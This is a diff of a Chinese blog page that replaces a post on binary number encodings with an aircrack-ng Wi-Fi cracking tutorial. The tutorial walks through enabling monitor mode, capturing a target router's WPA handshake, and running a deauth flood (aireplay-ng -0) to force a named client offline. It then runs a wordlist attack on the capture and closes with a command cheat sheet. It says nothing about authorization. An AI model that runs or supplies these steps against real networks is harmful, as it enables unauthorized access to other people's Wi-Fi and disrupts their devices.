@@ -46,20 +46,41 @@
   };
 </script>
 
-  <meta name="description" content="原码  就是二进制定点表示法，即最高位为符号位，“0”  表示正，“1” 表示负，其余位表示数值的大小。  通过一个字节，也就是8个二进制位表示 +7和 -7  0（符号位） 0000111   （+7  正数）  1（符号位） 0000111   （-7   负数）">
+  <meta name="description" content="开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="原码反码补码">
-<meta property="og:url" content="http://yoursite.com/2019/07/15/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E8%A1%A5%E7%A0%81/index.html">
+<meta property="og:title" content="Aircrack-ng使用">
+<meta property="og:url" content="http://yoursite.com/2019/07/28/Aircrack-ng%20%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="Hallcok">
-<meta property="og:description" content="原码  就是二进制定点表示法，即最高位为符号位，“0”  表示正，“1” 表示负，其余位表示数值的大小。  通过一个字节，也就是8个二进制位表示 +7和 -7  0（符号位） 0000111   （+7  正数）  1（符号位） 0000111   （-7   负数）">
+<meta property="og:description" content="开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-07-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-01-05T14:26:21.992Z">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_r.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_b.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_r.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_b.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_r.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_b.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_r.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_b.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_r.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_b.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_r.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_b.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_r.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_b.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_r.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_b.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_r.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_b.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_r.jpg">
+<meta property="article:published_time" content="2019-07-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-01-08T02:37:33.617Z">
 <meta property="article:author" content="Hallock">
-<meta property="article:tag" content="数据结构">
+<meta property="article:tag" content="Kali">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg">
 
-<link rel="canonical" href="http://yoursite.com/2019/07/15/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E8%A1%A5%E7%A0%81/">
+<link rel="canonical" href="http://yoursite.com/2019/07/28/Aircrack-ng%20%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">
 
 
 <script id="page-configurations">
@@ -71,7 +92,7 @@
   };
 </script>
 
-  <title>原码反码补码 | Hallcok</title>
+  <title>Aircrack-ng使用 | Hallcok</title>
   
 
 
@@ -200,7 +221,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/15/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E8%A1%A5%E7%A0%81/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/Aircrack-ng%20%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -213,7 +234,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          原码反码补码
+          Aircrack-ng使用
         </h1>
 
         <div class="post-meta">
@@ -223,14 +244,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2019-07-15 00:00:00" itemprop="dateCreated datePublished" datetime="2019-07-15T00:00:00+08:00">2019-07-15</time>
+              <time title="创建时间：2019-07-28 00:00:00" itemprop="dateCreated datePublished" datetime="2019-07-28T00:00:00+08:00">2019-07-28</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-01-05 22:26:21" itemprop="dateModified" datetime="2020-01-05T22:26:21+08:00">2020-01-05</time>
+                <time title="修改时间：2020-01-08 10:37:33" itemprop="dateModified" datetime="2020-01-08T10:37:33+08:00">2020-01-08</time>
               </span>
 
           
@@ -246,14 +267,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>421</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -265,58 +286,49 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>原码</p>
-<ul>
-<li><p>就是二进制定点表示法，即最高位为符号位，“0”  表示正，“1” 表示负，其余位表示数值的大小。</p>
-</li>
-<li><p>通过一个字节，也就是8个二进制位表示 +7和 -7</p>
-</li>
-<li><p>0（符号位） 0000111   （+7  正数）</p>
-</li>
-<li><p>1（符号位） 0000111   （-7   负数）</p>
+        <p><strong>开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。</strong></p>
 <a id="more"></a>
+<p><img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_r.jpg" alt=""></p>
+<p><strong>输入 ifconfig -a 查看网卡，多了个 wlan0，说明网卡已经适配好，不然可能是驱动有问题。</strong></p>
+<p><img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_r.jpg" alt=""></p>
+<p><strong>开启 monitor 模式，这里有些进程会影响到 monitor 模式的开启，如果开启成功可忽略，不然就依提示操作。</strong></p>
+<p><img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_b.jpg" alt="">)<img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_r.jpg" alt=""></p>
+<p><strong>按提示操作的结果：</strong></p>
+<p><img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_r.jpg" alt=""></p>
+<p><strong>监听网络，完了 Ctrl+C 退出。</strong></p>
+<p>airodump-ng  wlan0mon</p>
+<p><img src="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_r.jpg" alt=""></p>
+<p><strong>主要参数说明：</strong></p>
+<p><strong>#BSSID ：路由器、AP 的 MAC 地址</strong></p>
+<p><strong># PWR ：信号强度，一看就是越小越强了</strong></p>
+<p><strong># #Data ：传输的数据大小，大的可能在下载或看视频什么的</strong></p>
+<p><strong># CH ：无线信道，要看准</strong></p>
+<p><strong># ENC ：加密协议，自 WPA2 协议爆出重大安全漏洞，现已经出 WPA3，坐等更新</strong></p>
+<p><strong># ESSID ：这个就不用多说了，wifi 名称，有中文可能会出现乱码哈</strong></p>
+<p><strong>3. 目标有了，开始对其进行 cap 包的监听和获取，这里要让其中连接的设备重连才能抓包其握手包，可以慢慢等待，也可以使用 deauth 洪水攻击。</strong></p>
+<p><strong>root@huan:~#airodump-ng -c 9 –bssid 78:11:DC:10:4F:66 -w /root / 桌面 / wuxianpj/handshake/wlan0mon</strong></p>
+<p><strong>// -w 后面的路径是存放握手包的</strong></p>
+<p><img src="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_r.jpg" alt=""></p>
+<p><strong>4. 另起窗口，我们用 deauth 洪水攻击，让其中的一台设备掉线，它掉线后会自动连接（除非别人在 wifi 设置中勾选掉了自动连接）</strong></p>
+<p><strong>root@huan:~#aireplay-ng -0 20 -c 6C:88:14:F2:47:8C -a 78:11:DC:10:4F:66 wlan0mon</strong></p>
+<p><strong>// -0 death 模式，20 为攻击次数，也可以设为 0，就是一直攻击</strong></p>
+<p><strong>// -c 这里自然就是连接上的某台设备的 MAC 地址了，指定它，我们让它稳稳地掉线。</strong></p>
+<p><img src="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_r.jpg" alt=""></p>
+<p><strong>5. 看图，不废话</strong></p>
+<p><img src="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_r.jpg" alt=""></p>
+<p><strong>6. 话不多说，上字典（关键东西），让它慢慢破去吧</strong></p>
+<p><strong>root@huan:~#aircrack-ng -w /root / 桌面 / wuxianpj/zidian/wordlist.txt /root / 桌面 / wuxianpj/handshake/-02.cap</strong></p>
+<p><img src="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_r.jpg" alt=""></p>
+<p><strong>7. 没错下一步操作，退出 monitor 模式，别忘了喔</strong></p>
+<p><img src="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_r.jpg" alt=""></p>
+<p><strong>aircrack-ng 爆破 wifi 密码 – 命令清单</strong></p>
+<p><strong>~#airmon-ng start [网卡] // 开启 monitor 模式</strong></p>
+<p><strong>~#airodump-ng [网卡] // 捕获附件的 wifi 信息</strong></p>
+<p><strong>~#airodump-ng -c [信道]–bssid [路由器 MAC] -w [handshake-path] [网卡]</strong></p>
+<p><strong>~#aireplay-ng -0 [攻击次数值] -c [某连接设备 MAC] -a [路由器 MAC] [网卡]</strong></p>
+<p><strong>~#aircrack-ng -w [字典 - path] [破解的目标握手包 - path]</strong></p>
+<p><strong>~#airmon-ng stop [网卡] // 退出 monitor 模式</strong></p>
 <!-- more -->
-<p>反码</p>
-</li>
-<li><p>正数的反码与其源码相同； 负数的反码是对其源码逐位取反，但符号位除外。</p>
-</li>
-</ul>
-<p>补码</p>
-<ul>
-<li>正数的补码与其原码相同； 负数的补码是在其反码的末位加1</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>反码：</th>
-<th>补码：</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0 0000111 +7（原码）</td>
-<td>0  0000111  +7（原码）</td>
-</tr>
-<tr>
-<td>0 0000111 +7（反码）</td>
-<td>0  0000111  +7（补码）</td>
-</tr>
-<tr>
-<td>1 0000111 -7 （原码）</td>
-<td>1  1111000   -7（反码）</td>
-</tr>
-<tr>
-<td>1 1111000 -7 （反码）</td>
-<td>1  1111001   -7（补码）</td>
-</tr>
-</tbody></table>
-<p><strong>正数与负数补码相加为0</strong></p>
-<pre><code>    0 0000111                                
-+    0 1111001                
------------------------                          
-   10 0000000            （1超出八位被砍掉）
------------------------
-    0 0000000</code></pre><p>1加1得2由于二进制没有2所以保留0向前进1从左到右计算。</p>
-
     </div>
 
     
@@ -347,7 +359,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag"># 数据结构</a>
+              <a href="/tags/Kali/" rel="tag"># Kali</a>
           </div>
 
         
@@ -355,10 +367,13 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2019/07/15/Windows%E6%89%93%E5%BC%80%E6%9C%8D%E5%8A%A1%E7%9A%84DOS%E5%91%BD%E4%BB%A4/" rel="next" title="Window Dos 命令">
-      Window Dos 命令 <i class="fa fa-chevron-right"></i>
+    <a href="/2019/07/20/Android%20Studio%20%E6%B7%BB%E5%8A%A0okhttp/" rel="prev" title="Android Studio 添加 okhttp">
+      <i class="fa fa-chevron-left"></i> Android Studio 添加 okhttp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/09/07/Windows%E5%8F%B3%E9%94%AE%E6%B7%BB%E5%8A%A0VS%20code/" rel="next" title="windows右键添加VS code">
+      windows右键添加VS code <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
